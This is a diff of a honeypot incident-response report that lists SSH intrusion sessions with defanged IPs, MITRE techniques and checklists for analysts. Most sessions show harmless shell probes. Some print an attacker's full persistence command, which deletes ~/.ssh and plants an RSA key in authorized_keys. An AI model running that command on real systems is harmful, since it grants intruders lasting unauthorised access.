+| `2026-11-19 04:25:12` | `cowrie.login.success` |
+| `2026-11-19 04:25:15` | `cowrie.client.size` |
+| `2026-11-19 04:25:15` | `cowrie.session.params` |
+| `2026-11-19 04:25:16` | `cowrie.command.input` |
+| `2026-11-19 04:25:16` | `cowrie.command.input` |
+| `2026-11-19 04:25:16` | `cowrie.command.input` |
+| `2026-11-19 04:25:16` | `cowrie.command.input` |
+| `2026-11-19 04:25:16` | `cowrie.command.input` |
+| `2026-11-19 04:25:16` | `cowrie.command.input` |
+| `2026-11-19 04:25:16` | `cowrie.command.input` |
+| `2026-11-19 04:25:16` | `cowrie.command.input` |
+| `2026-11-19 04:25:16` | `cowrie.command.input` |
+| … | _47 more event(s) — see ir_cases.json_ |
+
+**Recommended Actions:**
+- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
+- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-9424924f4f8e
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `80.94.92[.]179` |
+| **First Seen** | 2026-11-19 04:27 |
+| **Last Seen** | 2026-11-19 04:27 |
+| **Session Duration** | 12s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3548352a8683984b03fa9375a48d9987_small_control'"'"' '"'"'check_3548352a8683984b03fa9375a48d9987'"'"'', printf '\n%s|%s\n' 'check_3548352a8683984b03fa9375a48d9987_small_control' 'check_3548352a8683984b03fa9375a48d9987', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_3548352a8683984b03fa9375a48d9987_small_math'"'"' "$((680*728+61))"', (680*728+61, printf '\n%s|%s\n' 'check_3548352a8683984b03fa9375a48d9987_small_math' ")"` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 04:27:26` | `cowrie.session.connect` |
+| `2026-11-19 04:27:26` | `cowrie.client.version` |
+| `2026-11-19 04:27:26` | `cowrie.client.kex` |
+| `2026-11-19 04:27:29` | `cowrie.login.success` |
+| `2026-11-19 04:27:32` | `cowrie.client.size` |
+| `2026-11-19 04:27:33` | `cowrie.session.params` |
+| `2026-11-19 04:27:34` | `cowrie.command.input` |
+| `2026-11-19 04:27:34` | `cowrie.command.input` |
+| `2026-11-19 04:27:34` | `cowrie.command.input` |
+| `2026-11-19 04:27:34` | `cowrie.command.input` |
+| `2026-11-19 04:27:34` | `cowrie.command.input` |
+| `2026-11-19 04:27:34` | `cowrie.command.input` |
+| `2026-11-19 04:27:34` | `cowrie.command.input` |
+| `2026-11-19 04:27:34` | `cowrie.command.input` |
+| `2026-11-19 04:27:34` | `cowrie.command.input` |
+| … | _47 more event(s) — see ir_cases.json_ |
+
+**Recommended Actions:**
+- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
+- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-8f17e13cbb44
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `80.94.92[.]179` |
+| **First Seen** | 2026-11-19 04:29 |
+| **Last Seen** | 2026-11-19 04:29 |
+| **Session Duration** | 12s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4156e0346f5ef9348f0810aa59b5e114_small_control'"'"' '"'"'check_4156e0346f5ef9348f0810aa59b5e114'"'"'', printf '\n%s|%s\n' 'check_4156e0346f5ef9348f0810aa59b5e114_small_control' 'check_4156e0346f5ef9348f0810aa59b5e114', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_4156e0346f5ef9348f0810aa59b5e114_small_math'"'"' "$((775*910+43))"', (775*910+43, printf '\n%s|%s\n' 'check_4156e0346f5ef9348f0810aa59b5e114_small_math' ")"` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 04:29:46` | `cowrie.session.connect` |
+| `2026-11-19 04:29:46` | `cowrie.client.version` |
+| `2026-11-19 04:29:46` | `cowrie.client.kex` |
+| `2026-11-19 04:29:50` | `cowrie.login.success` |
+| `2026-11-19 04:29:52` | `cowrie.client.size` |
+| `2026-11-19 04:29:53` | `cowrie.session.params` |
+| `2026-11-19 04:29:54` | `cowrie.command.input` |
+| `2026-11-19 04:29:54` | `cowrie.command.input` |
+| `2026-11-19 04:29:54` | `cowrie.command.input` |
+| `2026-11-19 04:29:54` | `cowrie.command.input` |
+| `2026-11-19 04:29:54` | `cowrie.command.input` |
+| `2026-11-19 04:29:54` | `cowrie.command.input` |
+| `2026-11-19 04:29:54` | `cowrie.command.input` |
+| `2026-11-19 04:29:54` | `cowrie.command.input` |
+| `2026-11-19 04:29:54` | `cowrie.command.input` |
+| … | _47 more event(s) — see ir_cases.json_ |
+
+**Recommended Actions:**
+- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
+- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-cafa6c5a3206
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `80.94.92[.]179` |
+| **First Seen** | 2026-11-19 04:32 |
+| **Last Seen** | 2026-11-19 04:32 |
+| **Session Duration** | 12s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_de70f63095b831d43614d76889a14270_small_control'"'"' '"'"'check_de70f63095b831d43614d76889a14270'"'"'', printf '\n%s|%s\n' 'check_de70f63095b831d43614d76889a14270_small_control' 'check_de70f63095b831d43614d76889a14270', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_de70f63095b831d43614d76889a14270_small_math'"'"' "$((116*592+6))"', (116*592+6, printf '\n%s|%s\n' 'check_de70f63095b831d43614d76889a14270_small_math' ")"` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 04:32:05` | `cowrie.session.connect` |
+| `2026-11-19 04:32:05` | `cowrie.client.version` |
+| `2026-11-19 04:32:05` | `cowrie.client.kex` |
+| `2026-11-19 04:32:09` | `cowrie.login.success` |
+| `2026-11-19 04:32:12` | `cowrie.client.size` |
+| `2026-11-19 04:32:13` | `cowrie.session.params` |
+| `2026-11-19 04:32:14` | `cowrie.command.input` |
+| `2026-11-19 04:32:14` | `cowrie.command.input` |
+| `2026-11-19 04:32:14` | `cowrie.command.input` |
+| `2026-11-19 04:32:14` | `cowrie.command.input` |
+| `2026-11-19 04:32:14` | `cowrie.command.input` |
+| `2026-11-19 04:32:14` | `cowrie.command.input` |
+| `2026-11-19 04:32:14` | `cowrie.command.input` |
+| `2026-11-19 04:32:14` | `cowrie.command.input` |
+| `2026-11-19 04:32:14` | `cowrie.command.input` |
+| … | _47 more event(s) — see ir_cases.json_ |
+
+**Recommended Actions:**
+- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
+- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-2471e7fd1f61
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `80.94.92[.]179` |
+| **First Seen** | 2026-11-19 04:34 |
+| **Last Seen** | 2026-11-19 04:34 |
+| **Session Duration** | 12s |
+| **Login Attempts** | 1 |
+| **Auth Success** | ✅ Yes — session established |
+| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a1f733638fb9ff15d9bd39726e95f6f4_small_control'"'"' '"'"'check_a1f733638fb9ff15d9bd39726e95f6f4'"'"'', printf '\n%s|%s\n' 'check_a1f733638fb9ff15d9bd39726e95f6f4_small_control' 'check_a1f733638fb9ff15d9bd39726e95f6f4', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_a1f733638fb9ff15d9bd39726e95f6f4_small_math'"'"' "$((587*273+45))"', (587*273+45, printf '\n%s|%s\n' 'check_a1f733638fb9ff15d9bd39726e95f6f4_small_math' ")"` |
+| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
+
+**Attack Timeline:**
+
+| Time (UTC) | Event |
+|---|---|
+| `2026-11-19 04:34:18` | `cowrie.session.connect` |
+| `2026-11-19 04:34:19` | `cowrie.client.version` |
+| `2026-11-19 04:34:19` | `cowrie.client.kex` |
+| `2026-11-19 04:34:23` | `cowrie.login.success` |
+| `2026-11-19 04:34:25` | `cowrie.client.size` |
+| `2026-11-19 04:34:26` | `cowrie.session.params` |
+| `2026-11-19 04:34:27` | `cowrie.command.input` |
+| `2026-11-19 04:34:27` | `cowrie.command.input` |
+| `2026-11-19 04:34:27` | `cowrie.command.input` |
+| `2026-11-19 04:34:27` | `cowrie.command.input` |
+| `2026-11-19 04:34:27` | `cowrie.command.input` |
+| `2026-11-19 04:34:27` | `cowrie.command.input` |
+| `2026-11-19 04:34:27` | `cowrie.command.input` |
+| `2026-11-19 04:34:27` | `cowrie.command.input` |
+| `2026-11-19 04:34:27` | `cowrie.command.input` |
+| … | _47 more event(s) — see ir_cases.json_ |
+
+**Recommended Actions:**
+- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
+- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
+- [ ] Review commands for lateral movement indicators
+- [ ] Escalate to Tier 2 if pattern repeats next shift
+
+### 🔴 HIGH · IR-4ecd0aa199e3
+
+| Field | Detail |
+|---|---|
+| **Source IP** | `35.214.148[.]230` |
+| **First Seen** | 2026-11-19 04:35 |
+| **Last Seen** | 2026-11-19 04:35 |
 | **Session Duration** | 0s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
+| **Commands Executed** | `User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0[.]0 Safari/537.36, Accept-Encoding: gzip, Connection: close` |
+| **TTPs (MITRE)** | T1078 |
 
 **Attack Timeline:**
 
 | Time (UTC) | Event |
 |---|---|
-| `2026-11-19 00:40:55` | `cowrie.session.connect` |
-| `2026-11-19 00:40:55` | `cowrie.client.version` |
-| `2026-11-19 00:40:55` | `cowrie.client.kex` |
-| `2026-11-19 00:40:55` | `cowrie.login.success` |
-| `2026-11-19 00:40:55` | `cowrie.direct-tcpip.request` |
-| `2026-11-19 00:40:56` | `cowrie.direct-tcpip.ja4` |
-| `2026-11-19 00:40:56` | `cowrie.direct-tcpip.data` |
-| `2026-11-19 00:40:56` | `cowrie.session.closed` |
+| `2026-11-19 04:35:03` | `cowrie.session.connect` |
+| `2026-11-19 04:35:03` | `cowrie.login.success` |
+| `2026-11-19 04:35:04` | `cowrie.session.params` |
+| `2026-11-19 04:35:04` | `cowrie.command.input` |
+| `2026-11-19 04:35:04` | `cowrie.command.input` |
+| `2026-11-19 04:35:04` | `cowrie.command.failed` |
+| `2026-11-19 04:35:04` | `cowrie.command.input` |
+| `2026-11-19 04:35:04` | `cowrie.command.failed` |
+| `2026-11-19 04:35:04` | `cowrie.command.input` |
+| `2026-11-19 04:35:04` | `cowrie.log.closed` |
+| `2026-11-19 04:35:04` | `cowrie.session.closed` |
 
 **Recommended Actions:**
-- [ ] Submit `138.226.239[.]234` to AbuseIPDB if not already reported
-- [ ] Block `138.226.239[.]234` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-31e23003e28a
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `101.36.114[.]181` |
-| **First Seen** | 2026-11-19 00:42 |
-| **Last Seen** | 2026-11-19 00:44 |
-| **Session Duration** | 71s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:42:51` | `cowrie.session.connect` |
-| `2026-11-19 00:42:51` | `cowrie.client.version` |
-| `2026-11-19 00:42:51` | `cowrie.client.kex` |
-| `2026-11-19 00:42:51` | `cowrie.login.success` |
-| `2026-11-19 00:44:01` | `cowrie.session.file_upload` |
-| `2026-11-19 00:44:02` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `101.36.114[.]181` to AbuseIPDB if not already reported
-- [ ] Block `101.36.114[.]181` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-51402d74d65d
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `138.226.239[.]233` |
-| **First Seen** | 2026-11-19 00:44 |
-| **Last Seen** | 2026-11-19 00:44 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:44:17` | `cowrie.session.connect` |
-| `2026-11-19 00:44:17` | `cowrie.client.version` |
-| `2026-11-19 00:44:17` | `cowrie.client.kex` |
-| `2026-11-19 00:44:17` | `cowrie.login.success` |
-| `2026-11-19 00:44:18` | `cowrie.direct-tcpip.request` |
-| `2026-11-19 00:44:18` | `cowrie.direct-tcpip.ja4` |
-| `2026-11-19 00:44:18` | `cowrie.direct-tcpip.data` |
-| `2026-11-19 00:44:18` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `138.226.239[.]233` to AbuseIPDB if not already reported
-- [ ] Block `138.226.239[.]233` at perimeter firewall / security group
-- [ ] Investigate TCP tunnel target — port forwarding via honeypot
-- [ ] Confirm tunnel target is not internal infrastructure
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-60fd5e28190b
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `80.94.92[.]234` |
-| **First Seen** | 2026-11-19 00:45 |
-| **Last Seen** | 2026-11-19 00:46 |
-| **Session Duration** | 24s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9e55fdb512ddc2c7423332aac1fd5237_small_control'"'"' '"'"'check_9e55fdb512ddc2c7423332aac1fd5237'"'"'', printf '\n%s|%s\n' 'check_9e55fdb512ddc2c7423332aac1fd5237_small_control' 'check_9e55fdb512ddc2c7423332aac1fd5237', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_9e55fdb512ddc2c7423332aac1fd5237_small_math'"'"' "$((654*535+85))"', (654*535+85, printf '\n%s|%s\n' 'check_9e55fdb512ddc2c7423332aac1fd5237_small_math' ")"` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:45:42` | `cowrie.session.connect` |
-| `2026-11-19 00:45:44` | `cowrie.client.version` |
-| `2026-11-19 00:45:44` | `cowrie.client.kex` |
-| `2026-11-19 00:45:49` | `cowrie.login.success` |
-| `2026-11-19 00:45:52` | `cowrie.client.size` |
-| `2026-11-19 00:45:54` | `cowrie.session.params` |
-| `2026-11-19 00:45:55` | `cowrie.command.input` |
-| `2026-11-19 00:45:55` | `cowrie.command.input` |
-| `2026-11-19 00:45:55` | `cowrie.command.input` |
-| `2026-11-19 00:45:55` | `cowrie.command.input` |
-| `2026-11-19 00:45:55` | `cowrie.command.input` |
-| `2026-11-19 00:45:55` | `cowrie.command.input` |
-| `2026-11-19 00:45:55` | `cowrie.command.input` |
-| `2026-11-19 00:45:55` | `cowrie.command.input` |
-| `2026-11-19 00:45:55` | `cowrie.command.input` |
-| … | _47 more event(s) — see ir_cases.json_ |
-
-**Recommended Actions:**
-- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
-- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
+- [ ] Submit `35.214.148[.]230` to AbuseIPDB if not already reported
+- [ ] Block `35.214.148[.]230` at perimeter firewall / security group
 - [ ] Review commands for lateral movement indicators
 - [ ] Escalate to Tier 2 if pattern repeats next shift
 
-### 🔴 HIGH · IR-979dc13a8329
+### 🔴 HIGH · IR-13c4d33d31ec
 
 | Field | Detail |
 |---|---|
-| **Source IP** | `114.35.59[.]237` |
-| **First Seen** | 2026-11-19 00:48 |
-| **Last Seen** | 2026-11-19 00:48 |
-| **Session Duration** | 13s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:48:46` | `cowrie.session.connect` |
-| `2026-11-19 00:48:46` | `cowrie.client.version` |
-| `2026-11-19 00:48:46` | `cowrie.client.kex` |
-| `2026-11-19 00:48:47` | `cowrie.login.success` |
-| `2026-11-19 00:48:48` | `cowrie.session.params` |
-| `2026-11-19 00:48:48` | `cowrie.command.input` |
-| `2026-11-19 00:48:48` | `cowrie.command.failed` |
-| `2026-11-19 00:48:49` | `cowrie.log.closed` |
-| `2026-11-19 00:48:50` | `cowrie.session.params` |
-| `2026-11-19 00:48:50` | `cowrie.command.input` |
-| `2026-11-19 00:48:50` | `cowrie.session.file_download` |
-| `2026-11-19 00:48:50` | `cowrie.log.closed` |
-| `2026-11-19 00:48:59` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `114.35.59[.]237` to AbuseIPDB if not already reported
-- [ ] Block `114.35.59[.]237` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Submit download hash(es) to VirusTotal
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-1bce0542d7b3
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `114.35.59[.]237` |
-| **First Seen** | 2026-11-19 00:48 |
-| **Last Seen** | 2026-11-19 00:48 |
-| **Session Duration** | 1s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **TTPs (MITRE)** | T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:48:50` | `cowrie.session.connect` |
-| `2026-11-19 00:48:50` | `cowrie.client.version` |
-| `2026-11-19 00:48:50` | `cowrie.client.kex` |
-| `2026-11-19 00:48:51` | `cowrie.login.success` |
-| `2026-11-19 00:48:52` | `cowrie.session.closed` |
-
-**Recommended Actions:**
-- [ ] Submit `114.35.59[.]237` to AbuseIPDB if not already reported
-- [ ] Block `114.35.59[.]237` at perimeter firewall / security group
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-007a539ade60
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `80.94.92[.]234` |
-| **First Seen** | 2026-11-19 00:52 |
-| **Last Seen** | 2026-11-19 00:52 |
-| **Session Duration** | 18s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f4c0254e2354e90640a392bda6dc66fe_small_control'"'"' '"'"'check_f4c0254e2354e90640a392bda6dc66fe'"'"'', printf '\n%s|%s\n' 'check_f4c0254e2354e90640a392bda6dc66fe_small_control' 'check_f4c0254e2354e90640a392bda6dc66fe', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_f4c0254e2354e90640a392bda6dc66fe_small_math'"'"' "$((843*632+92))"', (843*632+92, printf '\n%s|%s\n' 'check_f4c0254e2354e90640a392bda6dc66fe_small_math' ")"` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:52:11` | `cowrie.session.connect` |
-| `2026-11-19 00:52:12` | `cowrie.client.version` |
-| `2026-11-19 00:52:13` | `cowrie.client.kex` |
-| `2026-11-19 00:52:16` | `cowrie.login.success` |
-| `2026-11-19 00:52:20` | `cowrie.client.size` |
-| `2026-11-19 00:52:21` | `cowrie.session.params` |
-| `2026-11-19 00:52:22` | `cowrie.command.input` |
-| `2026-11-19 00:52:22` | `cowrie.command.input` |
-| `2026-11-19 00:52:22` | `cowrie.command.input` |
-| `2026-11-19 00:52:22` | `cowrie.command.input` |
-| `2026-11-19 00:52:22` | `cowrie.command.input` |
-| `2026-11-19 00:52:22` | `cowrie.command.input` |
-| `2026-11-19 00:52:22` | `cowrie.command.input` |
-| `2026-11-19 00:52:22` | `cowrie.command.input` |
-| `2026-11-19 00:52:22` | `cowrie.command.input` |
-| … | _47 more event(s) — see ir_cases.json_ |
-
-**Recommended Actions:**
-- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
-- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-80c63cadb65e
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `80.94.92[.]234` |
-| **First Seen** | 2026-11-19 00:54 |
-| **Last Seen** | 2026-11-19 00:54 |
-| **Session Duration** | 14s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_13df75c0ef1e16829d7fc6c488acbbfa_small_control'"'"' '"'"'check_13df75c0ef1e16829d7fc6c488acbbfa'"'"'', printf '\n%s|%s\n' 'check_13df75c0ef1e16829d7fc6c488acbbfa_small_control' 'check_13df75c0ef1e16829d7fc6c488acbbfa', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_13df75c0ef1e16829d7fc6c488acbbfa_small_math'"'"' "$((103*415+44))"', (103*415+44, printf '\n%s|%s\n' 'check_13df75c0ef1e16829d7fc6c488acbbfa_small_math' ")"` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:54:40` | `cowrie.session.connect` |
-| `2026-11-19 00:54:41` | `cowrie.client.version` |
-| `2026-11-19 00:54:41` | `cowrie.client.kex` |
-| `2026-11-19 00:54:45` | `cowrie.login.success` |
-| `2026-11-19 00:54:48` | `cowrie.client.size` |
-| `2026-11-19 00:54:49` | `cowrie.session.params` |
-| `2026-11-19 00:54:50` | `cowrie.command.input` |
-| `2026-11-19 00:54:50` | `cowrie.command.input` |
-| `2026-11-19 00:54:50` | `cowrie.command.input` |
-| `2026-11-19 00:54:50` | `cowrie.command.input` |
-| `2026-11-19 00:54:50` | `cowrie.command.input` |
-| `2026-11-19 00:54:50` | `cowrie.command.input` |
-| `2026-11-19 00:54:50` | `cowrie.command.input` |
-| `2026-11-19 00:54:51` | `cowrie.command.input` |
-| `2026-11-19 00:54:51` | `cowrie.command.input` |
-| … | _47 more event(s) — see ir_cases.json_ |
-
-**Recommended Actions:**
-- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
-- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-6a85ac542e8c
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `80.94.92[.]234` |
-| **First Seen** | 2026-11-19 00:59 |
-| **Last Seen** | 2026-11-19 01:00 |
-| **Session Duration** | 24s |
-| **Login Attempts** | 1 |
-| **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5ad546171ca7532c8d9917358fec9253_small_control'"'"' '"'"'check_5ad546171ca7532c8d9917358fec9253'"'"'', printf '\n%s|%s\n' 'check_5ad546171ca7532c8d9917358fec9253_small_control' 'check_5ad546171ca7532c8d9917358fec9253', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_5ad546171ca7532c8d9917358fec9253_small_math'"'"' "$((323*106+71))"', (323*106+71, printf '\n%s|%s\n' 'check_5ad546171ca7532c8d9917358fec9253_small_math' ")"` |
-| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |
-
-**Attack Timeline:**
-
-| Time (UTC) | Event |
-|---|---|
-| `2026-11-19 00:59:39` | `cowrie.session.connect` |
-| `2026-11-19 00:59:40` | `cowrie.client.version` |
-| `2026-11-19 00:59:40` | `cowrie.client.kex` |
-| `2026-11-19 00:59:46` | `cowrie.login.success` |
-| `2026-11-19 00:59:50` | `cowrie.client.size` |
-| `2026-11-19 00:59:57` | `cowrie.session.params` |
-| `2026-11-19 00:59:59` | `cowrie.command.input` |
-| `2026-11-19 00:59:59` | `cowrie.command.input` |
-| `2026-11-19 00:59:59` | `cowrie.command.input` |
-| `2026-11-19 00:59:59` | `cowrie.command.input` |
-| `2026-11-19 00:59:59` | `cowrie.command.input` |
-| `2026-11-19 00:59:59` | `cowrie.command.input` |
-| `2026-11-19 00:59:59` | `cowrie.command.input` |
-| `2026-11-19 00:59:59` | `cowrie.command.input` |
-| `2026-11-19 00:59:59` | `cowrie.command.input` |
-| … | _26 more event(s) — see ir_cases.json_ |
-
-**Recommended Actions:**
-- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
-- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
-- [ ] Review commands for lateral movement indicators
-- [ ] Escalate to Tier 2 if pattern repeats next shift
-
-### 🔴 HIGH · IR-10d042883b62
-
-| Field | Detail |
-|---|---|
-| **Source IP** | `219.79.17[.]110` |
-| **First Seen** | 2026-11-19 01:03 |
-| **Last Seen** | 2026-11-19 01:03 |
+| **Source IP** | `80.94.92[.]179` |
+| **First Seen** | 2026-11-19 04:36 |
+| **Last Seen** | 2026-11-19 04:36 |
 | **Session Duration** | 11s |
 | **Login Attempts** | 1 |
 | **Auth Success** | ✅ Yes — session established |
-| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
-| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
-| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
-| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |
